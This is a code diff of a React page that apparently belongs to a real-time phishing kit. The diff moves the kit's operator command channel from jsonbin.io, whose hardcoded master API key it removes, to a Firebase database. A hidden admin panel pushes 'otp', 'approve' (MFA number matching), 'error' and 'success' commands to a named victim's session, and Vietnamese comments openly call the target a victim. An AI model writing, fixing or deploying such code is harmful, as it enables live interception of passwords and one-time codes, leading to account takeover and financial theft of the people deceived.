@@ -2,8 +2,10 @@ import { useState, useEffect } from 'react';
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
 import { translations } from '../translations'; 
 
-const BIN_ID = '6ad7e7f5ac6210605a43b63c';
-const API_KEY = '$2a$10$aQUMOVeeqI4gvQgvEtfmz.mT7MtH0h2ddIYvYbYOMilObcfbHMBZG';
+// ==========================================
+// THAY LINK FIREBASE CỦA MÀY VÀO ĐÂY
+const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
+// ==========================================
 
 export default function Home() {
   const [lang, setLang] = useState('en');
@@ -79,24 +81,31 @@ export default function Home() {
       }).catch(()=>{}); 
   }, []);
 
-  // --- LẮNG NGHE LỆNH TỪ ADMIN ---
+  // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
   useEffect(() => {
-    const interval = setInterval(() => {
-        fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest?t=${Date.now()}`, {
-            headers: { 'X-Master-Key': API_KEY }
-        })
-        .then(res => res.json())
-        .then(data => {
-            if(data.record && data.record.target === sessionId) {
-                if (data.record.action === 'otp') { setStep(3); setMatchNumber(null); setShowSuccess(false); } 
-                else if (data.record.action === 'approve' && data.record.value) { setStep(3); setMatchNumber(data.record.value); setShowSuccess(false); } 
-                else if (data.record.action === 'error') { setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false); } 
-                else if (data.record.action === 'success') { setStep(3); setShowSuccess(true); }
-            }
-        }).catch(()=>{});
-    }, 2000);
+    let interval;
+    if (step === 3 && !showAdmin) {
+        // Dùng Firebase REST API để lấy dữ liệu. Dùng setInterval 3s cho an toàn.
+        interval = setInterval(() => {
+            fetch(`${FIREBASE_URL}/commands/${sessionId}.json?t=${Date.now()}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data) {
+                    if (data.action === 'otp' && matchNumber !== null) {
+                        setMatchNumber(null); setShowSuccess(false);
+                    } else if (data.action === 'approve' && data.value && matchNumber !== data.value) {
+                        setMatchNumber(data.value); setShowSuccess(false);
+                    } else if (data.action === 'success' && !showSuccess) {
+                        setShowSuccess(true);
+                    } else if (data.action === 'error' && step !== 2) {
+                        setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
+                    }
+                }
+            }).catch(()=>{});
+        }, 3000); // 3 giây check 1 lần
+    }
     return () => clearInterval(interval);
-  }, [sessionId]);
+  }, [step, showAdmin, sessionId, matchNumber, showSuccess]);
 
   // --- PHÍM TẮT MỞ ADMIN ---
   useEffect(() => {
@@ -144,14 +153,15 @@ export default function Home() {
     }, 1500);
   };
 
+  // --- HÀM GỬI LỆNH TỪ ADMIN LÊN FIREBASE ---
   const handleAdminCommand = (type, value) => {
       const targetUser = adminSessionId.trim(); 
       if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
       
-      fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+      fetch(`${FIREBASE_URL}/commands/${targetUser}.json`, {
           method: 'PUT',
-          headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY },
-          body: JSON.stringify({ action: type, value: value, target: targetUser })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: type, value: value })
       }).then(() => { alert(`Đã gửi lệnh thành công cho ${targetUser}!`); });
   };
 
